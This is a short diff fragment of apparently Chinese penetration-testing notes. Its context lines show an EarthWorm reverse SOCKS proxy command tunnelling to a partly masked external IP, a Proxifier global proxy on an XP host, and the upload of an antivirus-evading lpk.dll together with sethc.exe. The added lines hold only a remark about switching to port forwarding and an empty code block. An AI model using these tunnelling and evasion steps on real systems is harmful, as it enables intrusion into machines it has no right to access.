@@ -20,6 +20,10 @@ ew_for_Win.exe -s rssocks -d 45.*.*.190 -e 8889
 xp上
 Proxifie直接配置全局代理
 ```
+有点不稳 还是来一把端口转发吧
+```
+
+```
 
 # 上传lpk.dll
 上传的是渗透工具包里面的免杀版本，还附带了一个sethc.exe直接尝试运行这个exe
